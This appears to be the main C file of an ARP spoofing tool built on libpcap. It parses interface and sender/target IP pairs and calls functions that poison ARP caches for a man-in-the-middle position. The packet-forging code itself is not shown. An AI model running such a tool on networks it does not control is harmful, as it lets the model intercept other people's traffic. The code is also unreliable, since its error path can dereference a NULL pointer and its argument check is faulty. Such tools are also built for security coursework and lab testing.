#include <stdio.h>
#include <unistd.h>
#include <linux/if.h>
#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "attack.h"
#include "util.h"

void usage(void) 
{
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void destroy_ctx(struct attack_ctx *ctx)
{
    pcap_close(ctx->handle);
    free(ctx->infoes);
    free(ctx);
}

struct attack_ctx *create_ctx(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    struct attack_ctx *ctx;

    ctx = (struct attack_ctx *)calloc(1, sizeof(struct attack_ctx));
    if (ctx == NULL)
        goto alloc_error;

    ctx->info_count = argc / 2 - 1;
    ctx->infoes = (struct info *)calloc(ctx->info_count, sizeof(struct info));
    if (ctx->infoes == NULL) 
        goto alloc_error;

    strncpy(ctx->interface, argv[1], IFNAMSIZ);

    for (int i = 0; i < ctx->info_count; i++) {
        ctx->infoes[i].sender_ip = Ip(argv[i * 2 + 2]);
        ctx->infoes[i].target_ip = Ip(argv[i * 2 + 3]);
    }

    ctx->handle = pcap_open_live(ctx->interface, BUFSIZ, 1, 1, errbuf);
    if (ctx->handle == NULL) {
        pr_err("couldn't open device %s(%s)\n", ctx->interface, errbuf);
        goto alloc_error;
    }

    return ctx;

alloc_error:
    if (ctx->infoes)
        free(ctx->infoes);
    if (ctx)
        free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) 
{
    struct attack_ctx *ctx;
    int ret;
    
    if (argc < 4 && argc % 2) {
        usage();
        return 0;
    }

    ctx = create_ctx(argc, argv);
    if (ctx == NULL) {
        pr_err("Cannot create attack context\n");
        goto out_error;
    }

    ret = get_my_info(ctx);
    if (ret < 0) {
        pr_err("Cannot resolve my infomations\n");
        goto out_error;
    }
        
    ret = get_st_info(ctx);
    if (ret < 0) {
        pr_err("Cannot resolve sender & target infomations\n");
        goto out_error;
    }

    ret = spoof_packet(ctx);
    if (ret < 0) {
        pr_err("Error while spoofing packets\n");
        goto out_error;
    }

out_error:
    if (ctx)
        destroy_ctx(ctx);

    return 0;
}
